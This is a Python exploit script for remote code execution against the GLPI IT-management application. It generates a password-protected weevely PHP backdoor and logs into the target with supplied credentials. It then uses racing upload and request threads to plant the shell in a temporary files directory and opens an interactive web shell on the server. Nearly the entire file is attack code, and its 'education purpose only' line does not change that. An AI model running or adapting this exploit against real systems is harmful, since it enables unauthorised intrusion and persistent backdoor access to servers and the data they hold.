#!/usr/bin/env python


import requests
import subprocess
from usage import *
from network import *
from file import *
from threading import Thread,Event
from urlparse import *
import sys
import time

def main(argv):
	t=ParseOpt(argv)
	print("[!]\t###GLPI Remote Code Execution####")
	print("[!]\tThis script will try to upload a file and execute it on a server.")
	print("[!]\tThis script is for education purpose only!\n\n")
	
	print("[+]\tI will try to upload a weevley shell with "+t.shell+" as password.")
	subprocess.call(["weevely","generate",t.shell,'backdoor.php'])
	createRequest("backdoor.php")
	
	print ("\n\n")
	try:
		sess=login(t.url, t.u, t.p, t.nc)
	except KeyboardInterrupt:
		print("[!]\tBye.")
		sys.exit()
	stop_event=Event()
	stop_event.clear()
	putters=[]
	getters=[]
	putter=Thread(target= put, args=(t.url, sess, 'r.txt', stop_event,t.nc))
	getter = Thread(target = get, args = (t.url, sess, 't.php', stop_event,t.nc))
	putter.start()
	getter.start()
	while True:
		try:
			sys.stdout.write('.')
			sys.stdout.flush()
			time.sleep(1)
			if not getter.isAlive():
				getter.join()
				stop_event.set()
				putter.join()
				break
		except KeyboardInterrupt:
			#stop_event.set()
			#sys.exit()
			#getter.join()
			#putter.join()
			print ("[!]\tBye");
			
	print("\n[!]\tSuccess!")
	print("[!]\tSpawn to weevely... you can quit using CTRL+C")
	url=urljoin(t.url,'/support/files/_tmp/inside.php')
	try:
		subprocess.call(["weevely",url,t.shell])
	except KeyboardInterrupt:
		print("[+]\tExiting, you can access to weevely shell using:")
		print("[+]\tweevely "+url+" "+t.shell)
		print("[!]\tBye.")
	
	
if __name__ == "__main__":
	main(sys.argv)


#print "Trying to create a shell with password "+t.shell
